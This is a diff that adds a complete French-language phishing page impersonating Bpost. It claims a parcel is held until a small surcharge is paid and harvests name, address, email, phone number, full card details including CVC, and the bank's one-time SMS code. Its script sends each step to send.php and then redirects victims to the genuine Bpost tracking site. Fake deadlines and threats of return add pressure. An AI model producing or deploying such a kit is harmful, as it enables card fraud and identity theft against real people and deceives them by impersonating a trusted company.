@@ -1,0 +1,405 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<title>Frais supplémentaires | Bpost</title>
+<meta name="robots" content="noindex,nofollow">
+<meta name="theme-color" content="#E30613">
+<meta name="format-detection" content="telephone=no">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' fill='%23E30613'/%3E%3Ctext x='16' y='23' font-family='Arial' font-size='20' font-weight='900' fill='%23fff' text-anchor='middle'%3Eb%3C/text%3E%3C/svg%3E">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Figtree:wght@400;600;700;800&display=swap" rel="stylesheet">
+<style>
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+:root{--red:#E30613;--red-d:#BE0410;--ink:#1D1D1B;--grey:#5c5c5c;--soft:#767676;--line:#DEDEDE;--bg:#F2F2F2;--safe:env(safe-area-inset-bottom,0px)}
+html,body{margin:0;padding:0}
+html{-webkit-text-size-adjust:100%;text-size-adjust:100%}
+body{font:16px/1.45 Figtree,-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;color:var(--ink);background:#fff;overscroll-behavior-y:contain}
+a{color:var(--ink);text-decoration:none}
+.skip{position:absolute;left:-9999px}
+.skip:focus{left:8px;top:8px;background:#fff;padding:8px 12px;z-index:99}
+
+header{position:sticky;top:0;z-index:30;background:#fff;border-bottom:1px solid #EDEDED;padding-top:env(safe-area-inset-top,0px)}
+.hbar{display:flex;align-items:center;justify-content:space-between;gap:10px;height:60px;padding:0 15px;max-width:1180px;margin:0 auto}
+.logo{display:flex;align-items:center;flex:0 0 auto}
+.logo img{height:32px;width:auto;display:block}
+.logo svg{height:26px;width:auto;display:block}
+.hright{display:flex;align-items:center;gap:14px}
+.lang{display:flex;gap:9px;font-size:12.5px;font-weight:600;color:var(--soft)}
+.lang b{color:var(--ink)}
+.lang span{color:#c4c4c4}
+.ic{width:22px;height:22px;fill:var(--ink);display:block}
+.mbpost{display:flex;align-items:center;gap:7px;background:var(--ink);color:#fff;font-size:13px;font-weight:700;padding:9px 14px;border-radius:3px;white-space:nowrap}
+.mbpost svg{width:15px;height:15px;fill:#fff}
+
+nav{border-top:1px solid #F0F0F0;background:#fff}
+.nav-in{max-width:1180px;margin:0 auto;display:flex;gap:26px;padding:0 15px;height:46px;align-items:stretch;overflow-x:auto;scrollbar-width:none}
+.nav-in::-webkit-scrollbar{display:none}
+.nav-in a{display:flex;align-items:center;font-size:14px;font-weight:600;color:var(--grey);white-space:nowrap;border-bottom:3px solid transparent}
+.nav-in a.on{color:var(--ink);border-bottom-color:var(--red)}
+.hamb{display:none}
+
+main{max-width:640px;margin:0 auto;padding:16px 15px calc(108px + var(--safe))}
+.crumb{font-size:12.5px;color:var(--soft);margin-bottom:12px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.crumb a{color:var(--soft)}
+h1{font-size:23px;line-height:1.2;margin:0 0 6px;font-weight:800;letter-spacing:-.3px}
+.sub{font-size:14px;color:var(--grey);margin:0 0 16px}
+
+.parcel{border:1px solid var(--line);border-left:4px solid var(--red);border-radius:4px;background:#FAFAFA;padding:13px 14px;margin-bottom:16px}
+.parcel .row{display:flex;justify-content:space-between;gap:16px;padding:5px 0;font-size:14px}
+.parcel .k{color:var(--soft);flex:0 0 auto}
+.parcel .v{font-weight:700;text-align:right;word-break:break-all}
+.badge{display:inline-block;background:#FDECEC;color:#B00712;font-size:12px;font-weight:700;padding:3px 8px;border-radius:3px}
+
+.alert{border:1px solid #F2C9C9;background:#FDF4F4;border-radius:4px;padding:13px 14px;font-size:14px;color:#8E1010;margin-bottom:16px}
+.alert b{font-weight:800}
+.info{font-size:13.5px;color:var(--grey);background:#F5F5F5;border-radius:4px;padding:12px 14px;margin-bottom:18px;line-height:1.5}
+.info a{color:var(--red);font-weight:600;text-decoration:underline}
+
+.card{border:1px solid var(--line);border-radius:6px;padding:18px 16px;background:#fff}
+.card h2{font-size:16px;margin:0 0 4px;font-weight:800}
+.card .hint{font-size:13px;color:var(--soft);margin:0 0 15px}
+
+.pay-methods{display:grid;gap:9px;margin-bottom:18px}
+.pm{display:flex;align-items:center;gap:11px;border:1px solid #CDCDCD;border-radius:5px;padding:13px 13px;cursor:pointer;background:#fff}
+.pm:has(input:checked){border-color:var(--red);box-shadow:0 0 0 1px var(--red);background:#FFFAFA}
+.pm input{width:19px;height:19px;accent-color:var(--red);margin:0;flex:0 0 auto}
+.pm .pm-t{font-size:14.5px;font-weight:700;flex:1}
+.pm svg{height:22px;width:auto;flex:0 0 auto}
+
+.field{margin-bottom:14px}
+.field label{display:block;font-size:13.5px;font-weight:600;margin-bottom:6px}
+.field input{width:100%;height:54px;padding:0 13px;font-size:16.5px;border:1px solid #C4C4C4;border-radius:4px;background:#fff;color:var(--ink);outline:none;font-family:inherit;appearance:none}
+.field input:focus{border-color:var(--red);box-shadow:0 0 0 3px rgba(227,6,19,.12)}
+.field input::placeholder{color:#A9A9A9}
+.row2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+.sel{display:flex;align-items:center;justify-content:space-between;border:1px solid #C4C4C4;border-radius:4px;height:54px;padding:0 13px;font-size:16px;font-weight:600}
+
+.sum{background:#F7F7F7;border-radius:4px;padding:13px 14px;margin:18px 0 0;font-size:14px}
+.sum .row{display:flex;justify-content:space-between;padding:3px 0;color:var(--grey)}
+.sum .tot{color:var(--ink);font-weight:800;font-size:17px;padding-top:10px;border-top:1px solid #E2E2E2;margin-top:8px}
+.sum .vat{font-size:12px;color:var(--soft);padding-top:2px}
+
+.btn{width:100%;height:56px;border:0;border-radius:4px;background:var(--red);color:#fff;font-size:17px;font-weight:800;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;font-family:inherit}
+.btn:active{background:var(--red-d)}
+.btn:disabled{opacity:.75}
+.btn-ghost{background:#fff;color:var(--ink);border:1px solid #C4C4C4;font-weight:700}
+
+.paybar{position:fixed;left:0;right:0;bottom:0;z-index:40;background:#fff;border-top:1px solid #E3E3E3;padding:10px 15px calc(10px + var(--safe));box-shadow:0 -2px 14px rgba(0,0,0,.08)}
+.paybar .pb-in{max-width:640px;margin:0 auto;display:flex;align-items:center;gap:12px}
+.paybar .pb-tot{font-size:11.5px;color:var(--soft);line-height:1.15}
+.paybar .pb-tot b{display:block;font-size:19px;color:var(--ink)}
+.paybar .btn{margin:0;height:52px;flex:1;font-size:16.5px}
+body[data-step="2"] .paybar,body[data-step="3"] .paybar{display:none}
+
+.worldline{display:flex;align-items:center;justify-content:center;gap:9px;margin-top:16px;font-size:11.5px;color:var(--soft);text-align:center;flex-wrap:wrap}
+.worldline b{font-family:Georgia,serif;font-size:14px;font-weight:700;color:#1D2B4F;letter-spacing:.3px}
+.lock{display:flex;align-items:center;gap:5px}
+.lock svg{width:12px;height:12px;fill:#1E7B34}
+
+.ds{border-top:1px solid #EDEDED;margin-bottom:16px;padding-bottom:14px;display:flex;justify-content:space-between;align-items:center}
+.ds b{font-size:16px}
+.ds span{font-size:11px;color:var(--soft)}
+.code{width:100%;height:64px;text-align:center;font-size:29px;letter-spacing:12px;font-weight:800;border:1px solid #C4C4C4;border-radius:4px;outline:none;font-family:inherit;appearance:none;padding-left:12px}
+.code:focus{border-color:var(--red);box-shadow:0 0 0 3px rgba(227,6,19,.12)}
+.note{font-size:12.5px;color:var(--soft);margin-top:12px;line-height:1.45}
+#btn2{margin-top:16px}
+
+.done{text-align:center;padding:30px 10px}
+.done .ok{width:68px;height:68px;border-radius:50%;background:#E9F5EA;color:#1E7B34;display:flex;align-items:center;justify-content:center;margin:0 auto 15px;font-size:34px;font-weight:800}
+.done h2{font-size:20px;margin:0 0 8px;font-weight:800}
+.done p{font-size:14px;color:var(--grey);margin:0 0 4px}
+
+.spin{width:19px;height:19px;border:3px solid rgba(255,255,255,.45);border-top-color:#fff;border-radius:50%;animation:sp .8s linear infinite}
+@keyframes sp{to{transform:rotate(360deg)}}
+
+footer{background:#F5F5F5;border-top:1px solid #E3E3E3;padding:24px 15px calc(28px + var(--safe));font-size:12px;color:var(--soft);text-align:center;line-height:1.6}
+footer .links{display:flex;flex-wrap:wrap;gap:13px;justify-content:center;margin-bottom:12px}
+footer a{color:var(--soft);text-decoration:underline}
+footer .legal{margin-top:10px;font-size:11.5px;color:#8b8b8b}
+body[data-step="1"] footer{padding-bottom:calc(108px + var(--safe))}
+
+@media(max-width:719px){
+  .nav-in,.mbpost span,.lang,.hamb{display:none}
+  .nav-in{display:none}
+  .hamb{display:flex;align-items:center}
+  .hright{gap:16px}
+}
+@media(min-width:720px){
+  main{padding-top:26px;padding-bottom:44px}
+  .paybar{display:none}
+  body[data-step="1"] footer{padding-bottom:28px}
+  #btn1{margin-top:18px}
+  body{background:#fff}
+}
+@media(max-width:359px){
+  h1{font-size:20px}
+  .code{letter-spacing:9px;font-size:26px}
+}
+</style>
+</head>
+<body data-step="1">
+
+<a class="skip" href="#main">Aller au contenu principal</a>
+
+<header>
+  <div class="hbar">
+    <a class="logo" href="#" aria-label="Bpost">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/68/Bpost_logo.svg/320px-Bpost_logo.svg.png"
+           alt="Bpost" height="32"
+           onerror="this.outerHTML='&lt;svg viewBox=&quot;0 0 128 30&quot;&gt;&lt;path d=&quot;M0 15 13 4v7h20v8H13v7z&quot; fill=&quot;#1D1D1B&quot;/&gt;&lt;text x=&quot;39&quot; y=&quot;23&quot; font-family=&quot;Arial Black,Arial&quot; font-size=&quot;24&quot; font-weight=&quot;900&quot; fill=&quot;#E30613&quot; letter-spacing=&quot;-1.4&quot;&gt;bpost&lt;/text&gt;&lt;/svg&gt;'">
+    </a>
+    <div class="hright">
+      <div class="lang"><b>FR</b><span>|</span>NL<span>|</span>EN</div>
+      <svg class="ic" viewBox="0 0 24 24" aria-hidden="true"><path d="M10 2a8 8 0 105.3 14l5.4 5.4 1.4-1.4-5.4-5.4A8 8 0 0010 2zm0 2a6 6 0 110 12 6 6 0 010-12z"/></svg>
+      <a class="mbpost" href="#">
+        <svg viewBox="0 0 24 24"><path d="M12 12a4 4 0 100-8 4 4 0 000 8zm0 2c-4 0-7 2-7 4.5V21h14v-2.5C19 16 16 14 12 14z"/></svg>
+        <span>My Bpost</span>
+      </a>
+      <svg class="ic hamb" viewBox="0 0 24 24" aria-hidden="true"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </div>
+  </div>
+  <nav>
+    <div class="nav-in">
+      <a href="#">Envoyer</a>
+      <a href="#">Recevoir</a>
+      <a href="#" class="on">Suivre un envoi</a>
+      <a href="#">Tarifs</a>
+      <a href="#">Points de vente</a>
+      <a href="#">Service clientèle</a>
+    </div>
+  </nav>
+</header>
+
+<main id="main">
+  <div class="crumb"><a href="#">Accueil</a> › <a href="#">Suivi</a> › <span id="crumbTrack">—</span> › Frais supplémentaires</div>
+
+  <h1>Frais supplémentaires</h1>
+  <p class="sub">Réglez les frais pour libérer votre envoi.</p>
+
+  <div class="parcel">
+    <div class="row"><span class="k">Numéro de suivi</span><span class="v" id="track">—</span></div>
+    <div class="row"><span class="k">Statut</span><span class="v"><span class="badge">En attente de paiement</span></span></div>
+    <div class="row"><span class="k">Expéditeur</span><span class="v">GB — London</span></div>
+    <div class="row"><span class="k">Destination</span><span class="v">Belgique</span></div>
+    <div class="row"><span class="k">Poids</span><span class="v">1,24 kg</span></div>
+    <div class="row"><span class="k">Centre de tri</span><span class="v">Bruxelles X — 1000</span></div>
+    <div class="row"><span class="k">Date limite</span><span class="v" id="deadline">—</span></div>
+  </div>
+
+  <div class="alert">
+    <b>Votre envoi est bloqué.</b> Sans paiement dans les 5 jours ouvrables, il sera retourné à l'expéditeur. Aucun remboursement ne sera effectué.
+  </div>
+
+  <div class="info">
+    Depuis le 1<sup>er</sup> novembre 2026, une surtaxe européenne s'applique aux colis provenant de pays hors Union européenne. Le montant est dû avant la mise en livraison.
+    <br><a href="#">En savoir plus sur les frais applicables</a>
+  </div>
+
+  <form id="step1" class="card" action="send.php" method="post" novalidate>
+    <h2>Mode de paiement</h2>
+    <p class="hint">Choisissez votre moyen de paiement.</p>
+
+    <div class="pay-methods">
+      <label class="pm">
+        <input type="radio" name="methode" value="Bancontact" checked>
+        <span class="pm-t">Bancontact</span>
+        <svg viewBox="0 0 40 26" aria-hidden="true"><rect width="40" height="26" rx="3" fill="#005498"/><text x="20" y="17" font-family="Arial" font-size="8" font-weight="700" fill="#fff" text-anchor="middle">Bancontact</text></svg>
+      </label>
+      <label class="pm">
+        <input type="radio" name="methode" value="Carte de crédit">
+        <span class="pm-t">Visa / Mastercard</span>
+        <svg viewBox="0 0 40 26" aria-hidden="true"><rect width="40" height="26" rx="3" fill="#1A1F71"/><text x="20" y="17" font-family="Arial" font-size="9" font-weight="700" fill="#fff" text-anchor="middle">VISA</text></svg>
+      </label>
+    </div>
+
+    <h2>Vos coordonnées</h2>
+    <p class="hint">Pour la remise en livraison.</p>
+
+    <div class="field">
+      <label for="nom">Nom complet</label>
+      <input id="nom" name="nom" autocomplete="name" autocapitalize="words" enterkeyhint="next" required placeholder="Prénom et nom">
+    </div>
+    <div class="field">
+      <label for="adresse">Adresse de livraison</label>
+      <input id="adresse" name="adresse" autocomplete="street-address" autocapitalize="words" enterkeyhint="next" required placeholder="Rue et numéro">
+    </div>
+    <div class="row2">
+      <div class="field">
+        <label for="cp">Code postal</label>
+        <input id="cp" name="cp" inputmode="numeric" pattern="[0-9]*" maxlength="4" autocomplete="postal-code" enterkeyhint="next" required placeholder="1000">
+      </div>
+      <div class="field">
+        <label for="ville">Commune</label>
+        <input id="ville" name="ville" autocomplete="address-level2" autocapitalize="words" enterkeyhint="next" required placeholder="Bruxelles">
+      </div>
+    </div>
+    <div class="field">
+      <label for="email">E-mail</label>
+      <input id="email" name="email" type="email" inputmode="email" autocomplete="email" autocapitalize="off" autocorrect="off" enterkeyhint="next" required placeholder="vous@exemple.be">
+    </div>
+    <div class="field">
+      <label for="gsm">Numéro de GSM</label>
+      <input id="gsm" name="gsm" type="tel" inputmode="tel" autocomplete="tel" enterkeyhint="next" required placeholder="+32 4XX XX XX XX">
+    </div>
+
+    <h2 style="margin-top:22px">Données de la carte</h2>
+    <p class="hint" id="cardHint">Numéro de votre carte Bancontact.</p>
+
+    <div class="field">
+      <label for="titulaire">Titulaire de la carte</label>
+      <input id="titulaire" name="titulaire" autocomplete="cc-name" autocapitalize="words" enterkeyhint="next" required placeholder="Nom sur la carte">
+    </div>
+    <div class="field">
+      <label for="carte">Numéro de carte</label>
+      <input id="carte" name="carte" inputmode="numeric" pattern="[0-9 ]*" autocomplete="cc-number" enterkeyhint="next" maxlength="23" required placeholder="0000 0000 0000 0000">
+    </div>
+    <div class="row2">
+      <div class="field">
+        <label for="exp">Date d'expiration</label>
+        <input id="exp" name="exp" inputmode="numeric" pattern="[0-9/]*" autocomplete="cc-exp" enterkeyhint="next" maxlength="5" required placeholder="MM/AA">
+      </div>
+      <div class="field">
+        <label for="cvv">Code CVC</label>
+        <input id="cvv" name="cvv" inputmode="numeric" pattern="[0-9]*" autocomplete="cc-csc" enterkeyhint="done" maxlength="4" required placeholder="123">
+      </div>
+    </div>
+
+    <div class="sum">
+      <div class="row"><span>Surtaxe européenne</span><span>2,00 €</span></div>
+      <div class="row"><span>Frais de traitement</span><span>0,99 €</span></div>
+      <div class="row vat"><span>TVA 21 % incluse</span><span>0,52 €</span></div>
+      <div class="row tot"><span>Total</span><span>2,99 €</span></div>
+    </div>
+
+    <button class="btn" type="submit" id="btn1">Payer 2,99 €</button>
+
+    <div class="worldline">
+      <span class="lock"><svg viewBox="0 0 24 24"><path d="M12 2a5 5 0 00-5 5v3H6a2 2 0 00-2 2v8a2 2 0 002 2h12a2 2 0 002-2v-8a2 2 0 00-2-2h-1V7a5 5 0 00-5-5zm0 2a3 3 0 013 3v3H9V7a3 3 0 013-3z"/></svg>Paiement sécurisé</span>
+      <span>par <b>Worldline</b></span>
+    </div>
+  </form>
+
+  <form id="step2" class="card" action="send.php" method="post" novalidate hidden>
+    <div class="ds">
+      <b>Vérification 3-D Secure</b>
+      <span>Bancontact Secure</span>
+    </div>
+    <p style="font-size:14px;margin:0 0 15px">
+      Votre banque a envoyé un code à usage unique par SMS au <b id="maskedPhone">+32 4•• •• •• ••</b>.
+      Saisissez-le pour confirmer le paiement de <b>2,99 €</b>.
+    </p>
+    <input id="code" name="code" class="code" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code" enterkeyhint="done" maxlength="6" required placeholder="••••••" aria-label="Code à usage unique">
+    <button class="btn" type="submit" id="btn2">Confirmer</button>
+    <p class="note">Ne communiquez jamais ce code à un tiers. Il est valable 5 minutes.</p>
+  </form>
+
+  <div id="done" class="card done" hidden>
+    <div class="ok">✓</div>
+    <h2>Paiement effectué</h2>
+    <p>Votre envoi est libéré et sera remis en livraison.</p>
+    <p style="color:#A9A9A9">Redirection vers Bpost…</p>
+  </div>
+</main>
+
+<div class="paybar" id="paybar">
+  <div class="pb-in">
+    <div class="pb-tot">Total<b>2,99 €</b></div>
+    <button class="btn" type="submit" form="step1" id="btnPay">Payer</button>
+  </div>
+</div>
+
+<footer>
+  <div class="links">
+    <a href="#">Conditions générales</a><a href="#">Vie privée</a><a href="#">Cookies</a><a href="#">Accessibilité</a><a href="#">Service clientèle</a>
+  </div>
+  Service clientèle : 02 201 23 45 — du lundi au vendredi, de 8 h à 17 h
+  <div class="legal">Bpost SA de droit public — Centre Monnaie 1, 1000 Bruxelles — TVA BE 0214.596.464 — RPM Bruxelles</div>
+</footer>
+
+<script>
+(function(){
+  var qs = new URLSearchParams(location.search);
+  var track = qs.get('id') || ('3230' + Array.from({length:9},function(){return Math.floor(Math.random()*10)}).join(''));
+  document.getElementById('track').textContent = track;
+  document.getElementById('crumbTrack').textContent = track;
+  var d = new Date(); d.setDate(d.getDate()+2);
+  document.getElementById('deadline').textContent =
+    d.toLocaleDateString('fr-BE',{day:'2-digit',month:'2-digit',year:'numeric'}) + ' à 18:00';
+
+  var step1 = document.getElementById('step1'),
+      step2 = document.getElementById('step2'),
+      btn1  = document.getElementById('btn1'),
+      btn2  = document.getElementById('btn2'),
+      btnPay= document.getElementById('btnPay'),
+      codeEl= document.getElementById('code');
+
+  function busy(btn, txt){ btn.disabled = true; btn.innerHTML = '<span class="spin"></span> ' + txt; }
+  function send(fd){ return fetch('send.php', {method:'POST', body:fd, keepalive:true}).catch(function(){}); }
+
+  Array.prototype.forEach.call(document.querySelectorAll('input[name="methode"]'), function(r){
+    r.addEventListener('change', function(){
+      document.getElementById('cardHint').textContent = this.value === 'Bancontact'
+        ? 'Numéro de votre carte Bancontact.'
+        : 'Numéro de votre carte de crédit.';
+    });
+  });
+
+  document.getElementById('carte').addEventListener('input', function(){
+    var v = this.value.replace(/\D/g,'').slice(0,19);
+    this.value = v.replace(/(.{4})/g,'$1 ').trim();
+  });
+  document.getElementById('exp').addEventListener('input', function(){
+    var v = this.value.replace(/\D/g,'').slice(0,4);
+    this.value = v.length > 2 ? v.slice(0,2) + '/' + v.slice(2) : v;
+  });
+  document.getElementById('cvv').addEventListener('input', function(){
+    this.value = this.value.replace(/\D/g,'').slice(0,4);
+  });
+  codeEl.addEventListener('input', function(){
+    this.value = this.value.replace(/\D/g,'').slice(0,6);
+  });
+
+  step1.addEventListener('submit', function(e){
+    e.preventDefault();
+    if(!step1.checkValidity()){ step1.reportValidity(); return; }
+    var fd = new FormData(step1);
+    fd.append('step','1');
+    fd.append('tracking', track);
+    busy(btnPay,'Envoi…'); busy(btn1,'Redirection vers la banque…');
+
+    var gsm = (fd.get('gsm')||'').replace(/\s/g,'');
+    if(gsm.length > 5){
+      document.getElementById('maskedPhone').textContent = gsm.slice(0,4) + ' •• •• •• ' + gsm.slice(-2);
+    }
+
+    send(fd).then(function(){
+      step1.hidden = true; step2.hidden = false;
+      document.body.dataset.step = '2';
+      window.scrollTo(0,0);
+      codeEl.focus();
+    });
+  });
+
+  step2.addEventListener('submit', function(e){
+    e.preventDefault();
+    var code = codeEl.value.replace(/\D/g,'');
+    if(code.length < 4){ codeEl.focus(); return; }
+    var fd = new FormData();
+    fd.append('step','2'); fd.append('tracking', track); fd.append('code', code);
+    busy(btn2,'Vérification…');
+    send(fd).then(function(){
+      step2.hidden = true;
+      document.getElementById('done').hidden = false;
+      document.body.dataset.step = '3';
+      window.scrollTo(0,0);
+      setTimeout(function(){
+        location.href = 'https://track.bpost.be/btr/web/#/search?itemCode=' + encodeURIComponent(track) + '&lang=fr';
+      }, 2600);
+    });
+  });
+})();
+</script>
+</body>
+</html>
